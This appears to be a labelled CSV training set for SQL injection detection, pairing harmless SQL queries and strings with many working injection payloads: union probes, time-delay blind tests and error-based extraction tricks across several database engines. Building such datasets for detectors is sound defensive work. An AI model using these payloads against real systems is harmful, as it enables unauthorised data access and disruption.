Sentence,Label,Processed_Sentence
SELECT TOP 3 * FROM be,0.0,select top 0 * from be
"  SELECT * FROM across WHERE desk NOT IN  ( 'window', 'laid', 'eat' )  ",0.0,"  select * from across where desk not in  ( 'window', 'laid', 'eat' )  "
2473970000000000,0.0,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1.0,"0%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#"
" SELECT column_name ( s )  FROM so,giant",0.0," select column_name ( s )  from so,giant"
SELECT * FROM scientific WHERE acres BETWEEN fireplace09/01/1996escape AND something15/31/1996stems,0.0,select * from scientific where acres between fireplace0/0/0escape and something0/0/0stems
kamber@weat.gd,0.0,kamber@weat.gd
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND    ""asleep""",0.0,"select * from prize where had between ""ice"" and    ""asleep"""
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1.0,"0'||  (  select 'hdpi' where 0  =  0 and make_set  (  0  =  0,0   )    )   ||'"
1   )    )    as izvy where 2569  =  2569,1.0,0   )    )    as izvy where 0  =  0
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from individual where blind between '0-0-0' and '0-0-0'
66750565b,0.0,0b
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0.0,select top 0 percent * from picture select * from rod fetch first 0 percent rows onlyselect top 0 * from spirit
SELECT TOP 50 PERCENT * FROM crack,0.0,select top 0 percent * from crack
"  SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""5.000001"" ) ;",0.0,"  select subtime ( ""0-0-0 0:0:0.0"", ""0.0"" ) ;"
"-4522""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mbkq""  =  ""mbkq",1.0,"-0""  )   or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and   (  ""mbkq""  =  ""mbkq"
"  SELECT Orders.taughtrID, Employees.damage, Employees.yet FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fliesID ORDER BY Orders.roughID",0.0,"  select orders.taughtrid, employees.damage, employees.yet from ordersright join employees on orders.employeeid  =  employees.fliesid order by orders.roughid"
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1.0,"0""  )   and   (  select * from   (  select  (  sleep  (  0   )    )     )  gcrr  )  #"
SELECT * FROM tax WHERE NOT move = 'probably'  AND NOT neck = 'strange',0.0,select * from tax where not move = 'probably'  and not neck = 'strange'
chuchazo,0.0,chuchazo
1  )   as vqbf where 4020  =  4020,1.0,0  )   as vqbf where 0  =  0
"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",1.0,"select * from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0--"
SELECT Count ( * )  AS cause,0.0,select count ( * )  as cause
"1'   )    )    as jmnw where 6496  =  6496 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0'   )    )    as jmnw where 0  =  0 or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",1.0,"0""  )   as ghpx where 0  =  0 waitfor delay '0:0:0'--"
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from add where wealth between '0-0-0' and '0-0-0'
"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",1.0,"-0'||  (  select 'ryin' where 0  =  0 union all select 0,0,0#"
" SELECT column_name ( s ) FROM table1 T1, table1 T2  WHERE ",0.0," select column_name ( s ) from table0 t0, table0 t0  where "
"  SELECT Orders.enjoyrID, Employees.organization, Employees.she FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.singleID ORDER BY Orders.awareID",0.0,"  select orders.enjoyrid, employees.organization, employees.she from ordersright join employees on orders.employeeid  =  employees.singleid order by orders.awareid"
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,1.0,0'   )    )    as bewk where 0  =  0 or sleep  (  0  )  --
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,1.0,"0%""   )    )     )   or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and    (    (     (  ""%""  =  """
1'+  (  select gblp where 6768  =  6768,1.0,0'+  (  select gblp where 0  =  0
"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1.0,"0 where 0  =  0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0b0c0   )    )      )    )     )  ,0  )  #"
SELECT creature FROM pole UNION ALL SELECT involved FROM slip ORDER BY want,0.0,select creature from pole union all select involved from slip order by want
robby7,0.0,robby0
" SELECT * FROM root ORDER BY electric ASC, remarkable DESC",0.0," select * from root order by electric asc, remarkable desc"
 UPDATE practical SET hang = 'fellow'WHERE carried = 'mark',0.0, update practical set hang = 'fellow'where carried = 'mark'
SELECT lost ( s )  FROM obtain FULL OUTER JOIN,0.0,select lost ( s )  from obtain full outer join
78370849m,0.0,0m
shahir,0.0,shahir
SELECT * FROM giant WHERE string NOT LIKE '[person]%',0.0,select * from giant where string not like '[person]%'
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw",1.0,"0""   )    )     )   or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )    and    (    (     (  ""ugtw""  =  ""ugtw"
"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1.0,"0""  )   where 0  =  0 and exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )   --"
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1.0,"0"" and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and ""pmpk"" like ""pmpk"
"  SELECT * FROM cloud WHERE furniture IN  ( 'build', 'fallen', 'letter' )  ",0.0,"  select * from cloud where furniture in  ( 'build', 'fallen', 'letter' )  "
"  SELECT aroundID AS ID, appearance AS aid FROM child",0.0,"  select aroundid as id, appearance as aid from child"
wynnie,0.0,wynnie
1'  )   where 7537  =  7537 and 2006  =  2006,1.0,0'  )   where 0  =  0 and 0  =  0
denni,0.0,denni
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1.0,"0%""   )    )    rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  vwyq  )  #"
" end and    (    (     (  ""zpii"" like ""zpii",1.0," end and    (    (     (  ""zpii"" like ""zpii"
"iif  (  9342  =  6508,1,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
teodosio,0.0,teodosio
"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0%' and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
knyht9@aspirantes.lt,0.0,knyht0@aspirantes.lt
"SELECT ProductName, UnitPrice *  ( UnitsInStock + IIF ( IsNull ( UnitsOnOrder ) , 0, UnitsOnOrder  )  )   FROM Products;",0.0,"select productname, unitprice *  ( unitsinstock + iif ( isnull ( unitsonorder ) , 0, unitsonorder  )  )   from products;"
SELECT ran ( s )  FROM rising UNION ALL,0.0,select ran ( s )  from rising union all
"  SELECT long AS point, birth AS [clean]  FROM child",0.0,"  select long as point, birth as [clean]  from child"
1'||  (  select 'vpuh' where 8164  =  8164,1.0,0'||  (  select 'vpuh' where 0  =  0
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1.0,"0"" or row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )  "
1'+  (  select smze where 5616  =  5616,1.0,0'+  (  select smze where 0  =  0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1.0,"0' where 0  =  0 and 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  --"
1 and 6802  =  3592--,1.0,0 and 0  =  0--
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1.0,-0'   )    )     )   or 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and    (    (     (  'nzap' like 'nzap
kriz,0.0,kriz
413f1go,0.0,0f0go
"paseo los gofiones, 62,",0.0,"paseo los gofiones, 0,"
mamantona,0.0,mamantona
polvoraduque,0.0,polvoraduque
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",1.0,"select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0 and    (    (     (  'vcgc' like 'vcgc"
"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0  )   where 0  =  0 or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
"1   )    )    union all select null,null,null,null,null,null,null#",1.0,"0   )    )    union all select null,null,null,null,null,null,null#"
"1%"" union all select null,null#",1.0,"0%"" union all select null,null#"
73361115q,0.0,0q
bunyola,0.0,bunyola
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",1.0,"-0""  )   or elt  (  0  =  0,0  )   and   (  ""aivb"" like ""aivb"
"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1.0,"0%""  )   and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """
SELECT * FROM quick,0.0,select * from quick
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0%""   )    )     )   or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",1.0,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp"
SELECT flew ( s )  FROM only UNION,0.0,select flew ( s )  from only union
"  SELECT evening,money FROM hair WHERE contrast = 'am' UNION SELECT vegetable, anything FROM company",0.0,"  select evening,money from hair where contrast = 'am' union select vegetable, anything from company"
SELECT * FROM more WHERE NOT height = 'bite'  AND NOT expression = 'aside',0.0,select * from more where not height = 'bite'  and not expression = 'aside'
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",1.0,"0  )   and extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and   (  0  =  0"
1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1.0,0'+  (  select ophz where 0  =  0 rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  sgvo   )    )   +'
"caridad 82,",0.0,"caridad 0,"
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",1.0,"0"" where 0  =  0 and elt  (  0  =  0,0  )  --"
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1.0,0'||  (  select 'nvvm' from dual where 0  =  0 rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  sgvo   )    )   ||'
"concordia, 102,",0.0,"concordia, 0,"
SELECT MIN ( occur )  AS sand FROM capital,0.0,select min ( occur )  as sand from capital
"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",1.0,"-0""   )    )     )   or 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and    (    (     (  ""erua""  =  ""erua"
" SELECT column_name ( s )  FROM remember,remain",0.0," select column_name ( s )  from remember,remain"
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,1.0,"  (  select * from   (  select  (  sleep  (  0   )    )     )  srmq  )   and   (  ""%""  =  """
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1.0,-0  )   as ilrm where 0  =  0 or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )  --
"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1.0,"0"" where 0  =  0 and 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
"pl. quintero baez, 137",0.0,"pl. quintero baez, 0"
"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1.0,"-0""   )    )    as wvht where 0  =  0 union all select 0,0,0,0,0,0,0,0#"
2813,0.0,0
"1,  (  select   (  case when   (  3743  =  9640  )   then 1 else 3743*  (  select 3743 from master..sysdatabases  )   end   )    )   ",1.0,"0,  (  select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from master..sysdatabases  )   end   )    )   "
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1.0," select * from users where id  =  '0' union select +\.,@@version -- 0'"
"1""  )   as jngl where 8384  =  8384 and 4580  =  1718--",1.0,"0""  )   as jngl where 0  =  0 and 0  =  0--"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and   (  'atyf'  =  'atyf"
